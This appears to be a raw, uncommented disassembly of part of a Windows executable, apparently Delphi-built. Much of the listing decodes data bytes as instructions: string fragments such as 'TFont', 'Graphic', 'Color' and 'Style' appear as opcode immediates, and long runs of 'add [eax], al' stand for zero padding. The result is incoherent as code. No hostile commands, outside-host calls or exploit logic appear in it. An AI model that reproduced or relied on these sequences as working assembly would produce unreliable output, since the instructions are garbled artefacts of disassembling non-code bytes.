xor [ eax ] eax
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
popad
jo r-xdata
add [ eax ] al
clc
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax ] cx
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ 0xc0042 ] ah
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
cwde
and eax 0xa030042
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
popad
insd
nop
jl r-xdata
je r-xdata
je r-xdata
outsd
outsb
lea eax [ eax ]
sub [ 0xa030042 ] ah
push esp
inc esi
outsd
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
jae r-xdata
jb r-xdata
outsb
push ebx
inc esi
inc edx
add [ ecx ] al
or al 0x54
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
and eax 0xc08b0042
add [ esi ] ah
inc edx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
xchg esp eax
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + 0x66060042 ] dl
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
and eax 0x66060042
popad
jb r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ esi + 0x42 ] ah
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x25e8c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah bh
and eax 0x70070042
or al 0x70
jae r-xdata
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x42256c90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
daa
inc edx
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42266890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shl [ edi ] 0x42
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
sub [ edx ] al
pop es
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
mov [ ecx ] es
clc
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] ah
daa
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
outsd
add [ ecx ] al
add ch bh
jae r-xdata
add [ ebx ] al
mov eax eax
and al 0x27
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
push es
jo r-xdata
in al dx
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fisubr [ eax ]
inc edx
add dl ah
sub [ edx ] al
and al 0x0
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebp * 8 + 0x27 ] si
inc edx
add al ch
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax + 0x33 ] bh
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ edi + ebx * 2 + 0x41 ] dh
jpe r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
cmp eax 0x540f0042
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x2724c08b
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ 0x6e6f4654 ] al
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah ch
loop r-xdata
jo r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ecx
outsb
je r-xdata
dec ebp
jb r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
call sub_4269c8
or [ edi + 0x72 ] al
popad
jo r-xdata
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
call [ ecx + eax * 2 ]
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
sub [ edx ] al
pop es
add eax 0x6e6f4654
je r-xdata
inc edx
add al bh
lea eax [ ecx ]
add [ esi + 0x41300041 ] cl
inc edx
add [ eax ] al
pushfd
inc edx
add [ eax + eax ] ah
daa
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
cmp al 0x28
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add ah bh
daa
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
add [ eax ] al
cmp [ eax ] ch
inc edx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
mov esp 0x4228
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sub [ edx ] al
add [ eax ] eax
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edx + 0x28 ] si
inc edx
add [ edi ] al
inc eax
shl [ eax ] 0x40
sub [ edx ] al
or al 0x28
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add ah bl
xor [ eax ] al
in al dx
inc eax
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x4227e890
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x42256874
add [ esp + eax * 2 + 0x42 ] bh
jo r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
sub [ edx ] al
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
add [ esp + eax * 2 + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
push 0x7c004225
inc esp
inc edx
imul esp [ ebx + 0x73 ] 0x25780007
inc edx
add [ ebp + eax * 2 + 0x459c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
popad
insd
and al 0x25
inc edx
add [ ebp + eax * 2 + 0x42 ] ah
add [ ebp + eax * 2 + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
xchg esp eax
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
and al 0x42
add [ eax ] bl
add [ eax ] al
[ edx + eax * 2 + 0x42 ]
sub_4227f8
fdivr [ 0x540f0042 ]
inc edi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
cmp [ eax ] ch
inc edx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
mov esp 0x4228
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sub [ edx ] al
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edx + 0x28 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
sub [ edx ] al
pop es
add eax 0x6e6f4654
je r-xdata
add [ 0x6e6f4654 ] al
je r-xdata
call [ ecx + eax * 2 ]
inc edx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah ch
in al dx
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fisubr [ eax ]
inc edx
add dl ah
sub [ edx ] al
and al 0x0
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebp * 8 + 0x27 ] si
inc edx
add al ch
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
shl [ eax ] 0x40
sub [ edx ] al
or al 0x28
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
loop r-xdata
jo r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x42256874
add [ esp + eax * 2 + 0x42 ] bh
jo r-xdata
inc edx
add al bh
lea eax [ ecx ]
add [ esi + 0x41300041 ] cl
inc edx
add [ eax ] al
pushfd
inc edx
add [ eax + eax ] ah
daa
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
cmp al 0x28
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ esp + eax * 2 + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
push 0x7c004225
inc esp
inc edx
imul esp [ ebx + 0x73 ] 0x25780007
inc edx
add [ ebp + eax * 2 + 0x459c0042 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add ah bl
xor [ eax ] al
in al dx
inc eax
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
insd
and al 0x25
inc edx
add [ ebp + eax * 2 + 0x42 ] ah
add [ ebp + eax * 2 + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
xchg esp eax
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
and al 0x42
add [ eax ] bl
add [ eax ] al
[ edx + eax * 2 + 0x42 ]
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
sub [ edx ] al
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
sub_4229af
inc esp
inc edx
add [ eax * 2 + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
inc eax
add ah bl
xor [ eax ] al
or [ esi + 0x42 ] al
in al 0x25
inc edx
add [ eax * 2 + 0x45380042 ] ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
pop esp
dec eax
inc edx
imul esp [ ebx + 0x73 ] 0x24480004
inc edx
add [ eax + 0x47 ] dl
inc edx
add [ eax + 0x47 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
cmp [ edx ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x42 ] al
add [ eax + eax ] bl
add [ eax ] al
pushfd
daa
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
sub [ edx ] al
add al [ eax ]
or [ edi + 0x72 ] al
popad
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dl
dec eax
inc edx
add al bh
lea eax [ ecx ]
add [ esi + 0x48f80041 ] cl
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub eax [ edx ]
sbb [ eax ] al
add [ eax ] al
pushfd
daa
inc edx
add [ eax + 0x33 ] dh
add [ eax + ecx * 2 + 0x42 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x2b38c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] al
add [ eax ] bl
add [ eax ] al
add [ edi + 0x33700042 ] bl
inc edx
add [ eax ] bl
add [ eax ] al
[ eax ]
dec eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x39a9b91 ] al
and eax 0x482c0042
inc edx
add [ eax + ecx * 2 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax + ecx * 2 + 0x42 ] bl
add [ eax + eax ] al
add al bh
lea eax [ ecx ]
add [ esi + 0x46300041 ] cl
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
push eax
sub al [ edx ]
pop es
add al 0x54
push eax
outsb
cmp [ edx ] ch
inc edx
add [ eax + ebp ] cl
inc edx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] cl
inc esi
inc edx
cld
imul esp [ ebx + 0x73 ] 0x24480002
inc edx
add [ eax ] dh
dec edx
inc edx
add [ eax ] bh
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x42 ] dl
add [ eax + eax ] cl
add [ eax ] al
sbb [ ecx + 0x41 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + edx * 4 + 0x540a0041 ] bh
push eax
outsb
push edx
arpl [ gs : ecx + 0x6c ] sp
insb
nop
push esp
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add ah bh
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
inc edx
add [ ebx + ecx * 2 + 0x42 ] cl
add [ ebx + ecx * 2 + 0x42 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
cld
sub eax [ edx ]
or al 0x0
add [ eax ] al
sbb [ ecx + 0x41 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
push eax
sub eax [ edx ]
pop es
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sub al 0x42
add [ eax ] bl
add [ eax ] al
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + edx * 4 + 0x540c0041 ] bh
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add ah bh
jae r-xdata
imul esp [ ebx + 0x73 ] 0x2b4c0004
inc edx
add [ eax + eax ] dl
add bh bh
cwde
push ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] ch
inc edx
add [ eax + ebp ] cl
inc edx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
jae r-xdata
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
dec esp
inc edx
add al bh
lea eax [ ecx ]
add [ esi - 0x72ebffbf ] cl
inc ecx
add ah bl
push ebx
inc edx
add al cl
push ebx
inc edx
sub al 0x42
add [ edi ] al
add ah bh
push edx
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
push edx
arpl [ gs : ecx + 0x6c ] sp
insb
lea eax [ eax ]
mov al 0x2c
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
push esp
push eax
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
jl r-xdata
jae r-xdata
jns r-xdata
jae r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
add [ ebp + ebp + 0x42 ] dh
add [ edx ] cl
jo r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
sub al 0x42
add al ch
pop edi
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
outsd
call 0xc426f62
add [ eax ] al
inc eax
pop eax
outsd
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x52737009
xchg [ esp ] eax
jae r-xdata
popad
jae r-xdata
jo r-xdata
sub al [ edx ]
adc [ eax ] al
add bh bh
mov [ ecx + 0x42 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
js r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + edx - 0x336fffc0 ] dl
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
outsd
outsb
add al 0x42
jns r-xdata
ja r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
retn
push ebx
je r-xdata
xchg [ esp ] eax
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
jne r-xdata
push edx
inc edx
add [ ebx ] al
push cs
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
add [ gs : ecx ] cl
push edx
jb r-xdata
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
retn
add al 0x24
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
jg r-xdata
push ebx
je r-xdata
push es
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fisttp [ edx + 0x2400422e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x422f0cc0 ] cl
imul ebp [ esi + 0x67 ] 0x40110400
add [ ebp + ebp + 0x42 ] dh
inc eax
jb r-xdata
add [ esi + 0x422e ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
inc edx
add [ eax + 0x2f ] bh
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x41 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
mov [ ecx ] es
clc
lea eax [ ecx ]
mov al [ 0x14004268 ]
lea eax [ ecx ]
dec eax
pop [ ecx ]
xor [ eax + 0x42 ] ch
add [ ecx + ebp + 0x40 ] bl
add ah ch
push 0x295c0042
inc eax
add [ ecx + ebp + 0x40 ] bl
add [ edx + ebp * 2 ] dh
inc edx
add [ eax ] bh
push 0x42
add [ ecx + ebp + 0x40 ] bl
add [ eax + 0x5c00426a ] bh
sub [ eax ] eax
sbb al 0x6b
inc edx
add [ eax ] ah
imul eax [ edx ] 0x5c
sub [ eax ] eax
xor [ ebx + 0x42 ] ch
add al bh
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add [ ecx + ebp + 0x40 ] bl
add [ ecx + ebp + 0x40 ] bl
add [ ecx + ebp + 0x40 ] bl
add [ ecx + ebp + 0x40 ] bl
add [ ecx ] al
add ch bh
call [ eax + 0x800426a ]
push esp
inc edi
jb r-xdata
inc edx
inc edx
add [ ebp + 0x2e ] cl
inc edx
mov ecx 0xc700422f
das
inc edx
add cl dl
jo r-xdata
jb r-xdata
jae r-xdata
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
pushad
xor [ edx ] al
call sub_427213
add [ ebx + esi * 2 ] ah
inc edx
add [ eax + 0x4278 ] bl
jbe r-xdata
das
inc edx
add [ ecx - 0x4effbdd1 ] ch
das
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0x2f880040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ edx + 0x2e ] bl
inc edx
add [ ecx ] al
add [ eax ] al
outsb
add [ si ] al
adc [ eax ] eax
je r-xdata
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
inc ebp
jbe r-xdata
insd
popad
lea eax [ bx + si ]
insb
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
add [ eax ] cl
inc edi
jb r-xdata
add al ch
pushad
inc ecx
add [ eax ] al
add [ eax - 0x71 ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
sub [ edx ] al
sbb [ eax ] al
add [ eax ] al
add al [ eax ]
std
int 0xb8
jpe r-xdata
imul esp [ ebx + 0xc ] 0xe800422f
pushad
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + edx + 0x40 ] dl
inc edx
add al 0x11
outsb
je r-xdata
je r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
shl [ eax ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc edx
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc900000
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
inc edx
add [ eax + 0x4230 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6fffbdd0 ] al
xor [ edx ] al
sub al 0x0
add [ eax ] al
pushad
inc ecx
add [ eax + 0x33 ] dh
inc eax
